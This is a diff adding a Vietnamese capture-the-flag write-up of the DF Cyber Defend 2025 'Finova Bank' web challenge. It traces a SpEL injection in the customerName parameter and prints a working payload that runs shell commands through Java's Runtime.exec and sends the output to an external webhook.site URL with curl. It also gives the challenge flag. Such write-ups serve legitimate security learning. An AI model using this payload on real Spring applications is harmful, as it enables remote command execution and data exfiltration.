@@ -1,0 +1,138 @@
+# FINOVA BANK
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/df25-banner.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+# Mở đầu
+DF Cyber Defend 2025 là sự kiện diễn tập an ninh mạng quy mô lớn trong lĩnh vực tài chính - ngân hàng. Cuộc diễn tập năm nay thu hút sự tham gia của nhiều kỹ sư từ nhiều tổ chức tài chính, ngân hàng lớn và các chuyên gia đầu ngành.
+<br />
+Mình thì chưa có cơ hội để tham gia lúc sự kiện này diễn ra, nhưng về sau ban tổ chức có public challenge thì cũng thử làm xem sao.
+
+# Bắt đầu thôi
+Khi vào trang web thì cũng không có chức năng đăng nhập, đăng ký gì hết. Ta được chuyển thẳng vào trang nhìn rất là "tài chính":
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/home_page.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Theo kinh nghiệm thì cứ truyền vào các kí tự đặc biệt `" ' ( )` xem có điều gì xảy ra không. 
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/search.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Kết quả đã có lỗi Internal Server Error trả về, lỗi trong param `customerName`:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/error.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Anh lập trình viên lại tạo ra lỗi trong bước đưa dữ liệu về server rồi. Quan sát thấy lỗi `EL1045E`. <br />
+Tra cứu một hồi thì đây là lỗi trong `Spring Expression Language` (SpEL), một ngôn ngữ biểu thức được sử dụng trong Java, cụ thể trong Spring Framework. <br />
+SpEL cho phép viết các biểu thức động trong code hoặc file cấu hình Spring:
+```
+@Value("#{user.name}")
+@Value("#{T(Math).random()}")
+```
+Nhìn lại message báo lỗi trong Burp một lần nữa, chú ý thấy đoạn `[ \"a\"\"]`. Vậy là khi ta inject dấu nháy kép vào đây đã phá vỡ cấu trúc của 1 lệnh nào đó và dẫn tới lỗi. Thế thì khả năng đây là lỗi gì đó tương tự như SQLi đây.
+<br />
+Mục tiêu của mình là tìm hiểu cách viết các câu lệnh SpEL và làm sao chèn payload vào để không còn báo lỗi nữa.
+<br />
+Google và GPT một chút, mình tìm được một số đoạn code sử dụng SpEL trong Java có vẻ hợp lý:
+<br />
+Ví dụ 1:
+```
+class Customer {
+    private String customerName;
+
+    public Customer(String customerName) {
+        this.customerName = customerName;
+    }
+
+    public String getCustomerName() {
+        return customerName;
+    }
+}
+
+public class SpELCustomerExample {
+    public static void main(String[] args) {
+        Customer customer = new Customer("Alice");
+
+        ExpressionParser parser = new SpelExpressionParser();
+
+        // Biểu thức SpEL: kết hợp chuỗi input trong nháy kép với customerName
+        String expression = "\"Welcome, \" + customerName";
+        String message = parser.parseExpression(expression).getValue(customer, String.class);
+
+        System.out.println(message); // Output: Welcome, Alice
+    }
+}
+```
+Ví dụ 2:
+```
+public class SpELCustomerCheck {
+    public static void main(String[] args) {
+        Customer customer = new Customer("Bob");
+
+        ExpressionParser parser = new SpelExpressionParser();
+
+        // So sánh customerName với một chuỗi input
+        boolean isBob = parser.parseExpression("customerName == \"Bob\"")
+                              .getValue(customer, Boolean.class);
+
+        System.out.println(isBob); // Output: true
+    }
+}
+```
+Trong SpEL cũng có các toán tử login như `and`, `or`.
+<br />
+Giờ mình thử 1 payload nào đó xem sao, ví dụ `a" and "1" == "1` thì thấy trả về lỗi sau:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/error_logic.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Vậy là "a" đang được coi như String, điều chỉnh payload thành `a" == "a" and "1" = "1` thì thu được kết quả:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/successfully.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Giờ chơi lớn với lệnh command luôn, trong Java mình sử dụng `T(java.lang.Runtime).getRuntime().exec(...)`
+<br />
+Cụ thể:
+`a" == "a" or 1 == (T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh", "-c", "ls -la / | base64 -w0 | curl -X POST https://webhook.site/70dca831-6a78-4402-840a-37acf3237ab4 --data-binary @-"})) or "1" = "1`
+Trong Webhook đã có request tới:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/webhook.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Decode thì đọc được:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/finova_bank/decode.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Từ đây đơn giản thay lệnh command và đọc được flag thôi: `DF25{Y0u_c0UlD_5p3L_7h3_3xpr35510N!!}`
